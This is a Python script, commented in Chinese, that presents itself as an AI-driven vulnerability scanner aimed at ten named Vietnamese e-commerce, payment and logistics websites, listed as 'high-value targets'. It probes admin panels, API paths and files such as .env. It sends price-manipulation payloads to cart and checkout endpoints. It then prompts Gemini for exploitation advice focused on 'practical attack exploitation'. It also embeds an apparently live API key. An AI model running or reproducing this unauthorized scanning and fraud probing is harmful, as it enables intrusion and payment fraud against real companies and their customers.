#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AI驱动的越南漏洞扫描器
Vietnam AI-Powered Vulnerability Scanner

结合AI智能分析和越南目标专用漏洞扫描
"""

import requests
import json
import time
from datetime import datetime
import urllib3
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AIVietnamScanner:
    """AI驱动的越南漏洞扫描器"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.session.verify = False
        self.results = []
        self.lock = threading.Lock()

        # Gemini API配置
        self.gemini_api_key = "AIzaSyCjMszGNOpYodeIVGzjErmX-T0aIpnIcHk"
        self.gemini_api_url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash-exp:generateContent"

        # 越南高价值目标
        self.targets = [
            {"name": "Shopee Vietnam", "url": "https://shopee.vn", "type": "ecommerce"},
            {"name": "MoMo Wallet", "url": "https://momo.vn", "type": "payment"},
            {"name": "Tiki", "url": "https://tiki.vn", "type": "ecommerce"},
            {"name": "Viettel Post", "url": "https://viettelpost.vn", "type": "logistics"},
            {"name": "ZaloPay", "url": "https://zalopay.vn", "type": "payment"},
            {"name": "Lazada Vietnam", "url": "https://lazada.vn", "type": "ecommerce"},
            {"name": "VNPost", "url": "https://vnpost.vn", "type": "logistics"},
            {"name": "VNPay", "url": "https://vnpay.vn", "type": "payment"},
            {"name": "Giao Hang Nhanh", "url": "https://giaohangnhanh.vn", "type": "logistics"},
            {"name": "GHTK", "url": "https://ghtk.vn", "type": "logistics"}
        ]

    def call_gemini_ai(self, prompt):
        """调用Gemini AI进行分析"""
        try:
            payload = {
                "contents": [
                    {
                        "parts": [
                            {
                                "text": prompt
                            }
                        ]
                    }
                ],
                "generationConfig": {
                    "temperature": 0.7,
                    "maxOutputTokens": 4096,
                    "candidateCount": 1
                }
            }

            headers = {
                "Content-Type": "application/json"
            }

            response = requests.post(
                f"{self.gemini_api_url}?key={self.gemini_api_key}",
                headers=headers,
                json=payload,
                timeout=30
            )

            if response.status_code == 200:
                result = response.json()
                if "candidates" in result and result["candidates"]:
                    content = result["candidates"][0]["content"]["parts"][0]["text"]
                    return {
                        "success": True,
                        "content": content,
                        "model": "gemini-2.0-flash-exp"
                    }
                else:
                    return {"success": False, "error": "No valid response"}
            else:
                return {"success": False, "error": f"HTTP {response.status_code}"}

        except Exception as e:
            return {"success": False, "error": str(e)}

    def scan_target_vulnerabilities(self, target):
        """扫描单个目标的漏洞"""
        print(f"\n[SCAN] 正在扫描: {target['name']} ({target['url']})")

        result = {
            "target": target,
            "scan_start": datetime.now().isoformat(),
            "vulnerabilities": [],
            "accessible": False,
            "ai_analysis": None
        }

        try:
            # 基础连通性测试
            response = self.session.get(target['url'], timeout=15)
            if response.status_code == 200:
                result["accessible"] = True
                print(f"   [OK] 目标可访问")

                # 1. 管理后台检测
                admin_paths = ["/admin", "/wp-admin", "/login", "/dashboard", "/backend"]
                for path in admin_paths:
                    try:
                        admin_url = target['url'] + path
                        admin_resp = self.session.get(admin_url, timeout=5)
                        if admin_resp.status_code in [200, 401, 403]:
                            result["vulnerabilities"].append({
                                "type": "admin_panel",
                                "url": admin_url,
                                "status": admin_resp.status_code,
                                "severity": "High" if admin_resp.status_code == 200 else "Medium"
                            })
                            print(f"   [ADMIN] 发现管理后台: {path}")
                    except:
                        continue

                # 2. API端点检测
                api_paths = ["/api", "/api/v1", "/rest", "/webapi"]
                for path in api_paths:
                    try:
                        api_url = target['url'] + path
                        api_resp = self.session.get(api_url, timeout=5)
                        if api_resp.status_code == 200:
                            content = api_resp.text.lower()
                            if any(word in content for word in ["password", "token", "key"]):
                                result["vulnerabilities"].append({
                                    "type": "api_info_leak",
                                    "url": api_url,
                                    "severity": "High"
                                })
                                print(f"   [API] 发现信息泄露: {path}")
                    except:
                        continue

                # 3. 敏感文件检测
                vuln_files = ["/phpinfo.php", "/info.php", "/test.php", "/.env"]
                for file in vuln_files:
                    try:
                        file_url = target['url'] + file
                        file_resp = self.session.get(file_url, timeout=5)
                        if file_resp.status_code == 200:
                            result["vulnerabilities"].append({
                                "type": "sensitive_file",
                                "url": file_url,
                                "severity": "Medium"
                            })
                            print(f"   [FILE] 发现敏感文件: {file}")
                    except:
                        continue

                # 4. 业务逻辑漏洞检测（电商特定）
                if target['type'] == 'ecommerce':
                    # 价格操纵检测
                    test_payloads = [
                        {"price": 0, "quantity": 1},
                        {"total": 1, "original": 1000000}
                    ]

                    test_urls = [
                        f"{target['url']}/api/cart",
                        f"{target['url']}/api/checkout"
                    ]

                    for url in test_urls:
                        for payload in test_payloads:
                            try:
                                test_resp = self.session.post(url, json=payload, timeout=5)
                                if test_resp.status_code == 200:
                                    try:
                                        resp_data = test_resp.json()
                                        if resp_data.get('success') or resp_data.get('total', 999999) < 1000:
                                            result["vulnerabilities"].append({
                                                "type": "price_manipulation",
                                                "url": url,
                                                "severity": "Critical",
                                                "payload": payload
                                            })
                                            print(f"   [BUSINESS] 发现价格操纵漏洞")
                                    except:
                                        pass
                            except:
                                continue

                # 5. AI智能分析
                print(f"   [AI] 正在进行AI分析...")
                ai_prompt = f"""
作为网络安全专家，请分析以下越南目标的漏洞情况：

目标: {target['name']} ({target['type']})
URL: {target['url']}

发现的漏洞:
{json.dumps(result['vulnerabilities'], ensure_ascii=False, indent=2)}

请提供：
1. 漏洞严重程度评估
2. 攻击可行性分析
3. 业务影响评估
4. 利用建议
5. 防护措施

用中文回答，重点关注实际的攻击利用。
"""

                ai_result = self.call_gemini_ai(ai_prompt)
                if ai_result["success"]:
                    result["ai_analysis"] = ai_result["content"]
                    print(f"   [AI] AI分析完成")
                else:
                    print(f"   [AI] AI分析失败: {ai_result.get('error', 'Unknown')}")

            else:
                print(f"   [FAIL] 目标不可访问 ({response.status_code})")

        except Exception as e:
            print(f"   [ERROR] 扫描失败: {str(e)[:50]}")

        result["scan_end"] = datetime.now().isoformat()
        result["total_vulnerabilities"] = len(result["vulnerabilities"])

        # 计算风险评分
        critical_count = len([v for v in result["vulnerabilities"] if v.get("severity") == "Critical"])
        high_count = len([v for v in result["vulnerabilities"] if v.get("severity") == "High"])
        result["risk_score"] = critical_count * 10 + high_count * 5 + len(result["vulnerabilities"])

        with self.lock:
            self.results.append(result)

        print(f"   [DONE] 扫描完成 - 发现 {result['total_vulnerabilities']} 个漏洞，风险评分: {result['risk_score']}")
        return result

    def scan_all_targets(self, max_workers=3):
        """扫描所有目标"""
        print("AI驱动的越南漏洞扫描器")
        print("深度安全测试与AI智能分析")
        print("=" * 50)
        print(f"总目标数: {len(self.targets)}")
        print(f"并发扫描: {max_workers} 个线程")
        print()

        # 使用线程池并发扫描
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(self.scan_target_vulnerabilities, target) for target in self.targets]

            for future in as_completed(futures):
                try:
                    future.result()
                    time.sleep(1)  # 避免过于频繁
                except Exception as e:
                    print(f"扫描出错: {e}")

        return self.results

    def generate_comprehensive_report(self, results):
        """生成综合报告"""
        total_targets = len(results)
        accessible = len([r for r in results if r.get("accessible")])
        total_vulns = sum(r.get("total_vulnerabilities", 0) for r in results)

        # 按风险评分排序
        sorted_results = sorted(results, key=lambda x: x.get("risk_score", 0), reverse=True)

        print("\n" + "=" * 60)
        print("AI越南漏洞扫描综合报告")
        print("=" * 60)
        print(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"总目标数: {total_targets}")
        print(f"可访问: {accessible}")
        print(f"总漏洞数: {total_vulns}")

        # 风险统计
        critical_targets = [r for r in results if any(v.get("severity") == "Critical" for v in r.get("vulnerabilities", []))]
        high_targets = [r for r in results if any(v.get("severity") == "High" for v in r.get("vulnerabilities", []))]

        print(f"严重漏洞目标: {len(critical_targets)} 个")
        print(f"高危漏洞目标: {len(high_targets)} 个")

        # Top 5 高风险目标
        print(f"\nTop 5 高风险目标:")
        print("-" * 60)
        for i, result in enumerate(sorted_results[:5], 1):
            target = result["target"]
            vulns = result["vulnerabilities"]
            risk_score = result.get("risk_score", 0)

            print(f"\n{i}. {target['name']} ({target['type']})")
            print(f"   URL: {target['url']}")
            print(f"   漏洞数: {len(vulns)}")
            print(f"   风险评分: {risk_score}")

            # 显示关键漏洞
            critical_vulns = [v for v in vulns if v.get("severity") == "Critical"]
            high_vulns = [v for v in vulns if v.get("severity") == "High"]

            if critical_vulns:
                print(f"   严重漏洞: {len(critical_vulns)} 个")
                for vuln in critical_vulns[:2]:  # 只显示前2个
                    print(f"     - {vuln['type']}: {vuln.get('url', 'N/A')}")

            if high_vulns:
                print(f"   高危漏洞: {len(high_vulns)} 个")
                for vuln in high_vulns[:2]:  # 只显示前2个
                    print(f"     - {vuln['type']}: {vuln.get('url', 'N/A')}")

            # 显示AI分析摘要
            if result.get("ai_analysis"):
                ai_summary = result["ai_analysis"][:200] + "..." if len(result["ai_analysis"]) > 200 else result["ai_analysis"]
                print(f"   AI分析: {ai_summary}")

        # 漏洞类型统计
        vuln_types = {}
        for result in results:
            for vuln in result.get("vulnerabilities", []):
                vuln_type = vuln.get("type", "unknown")
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1

        if vuln_types:
            print(f"\n漏洞类型统计:")
            print("-" * 40)
            sorted_types = sorted(vuln_types.items(), key=lambda x: x[1], reverse=True)
            for vuln_type, count in sorted_types:
                print(f"{vuln_type}: {count} 个")

        # 保存详细报告
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"ai_vietnam_scan_report_{timestamp}.json"

        report_data = {
            "scan_info": {
                "timestamp": datetime.now().isoformat(),
                "total_targets": total_targets,
                "accessible": accessible,
                "total_vulnerabilities": total_vulns,
                "critical_targets": len(critical_targets),
                "high_targets": len(high_targets),
                "ai_enabled": True,
                "ai_model": "gemini-2.0-flash-exp"
            },
            "vulnerability_types": vuln_types,
            "top_risky_targets": [
                {
                    "target": result["target"],
                    "risk_score": result.get("risk_score", 0),
                    "vulnerabilities": result["vulnerabilities"],
                    "ai_analysis": result.get("ai_analysis")
                }
                for result in sorted_results[:5]
            ],
            "full_results": results
        }

        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)

        print(f"\n详细报告已保存到: {report_file}")
        return report_file

def main():
    """主程序"""
    scanner = AIVietnamScanner()

    # 扫描所有目标
    results = scanner.scan_all_targets(max_workers=3)

    # 生成综合报告
    report_file = scanner.generate_comprehensive_report(results)

    # 总结
    critical_targets = [r for r in results if any(v.get("severity") == "Critical" for v in r.get("vulnerabilities", []))]
    high_targets = [r for r in results if any(v.get("severity") == "High" for v in r.get("vulnerabilities", []))]

    print(f"\n重点关注:")
    if critical_targets:
        print(f"  严重漏洞目标: {len(critical_targets)} 个")
        for target in critical_targets:
            print(f"    • {target['target']['name']} (风险评分: {target.get('risk_score', 0)})")

    if high_targets:
        print(f"  高危漏洞目标: {len(high_targets)} 个")
        for target in high_targets:
            print(f"    • {target['target']['name']} (风险评分: {target.get('risk_score', 0)})")

    print(f"\nAI越南漏洞扫描完成!")
    print(f"报告文件: {report_file}")
    print(f"AI模型: Gemini 2.0 Flash Exp")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n扫描被用户中断")
    except Exception as e:
        print(f"\n扫描出错: {e}")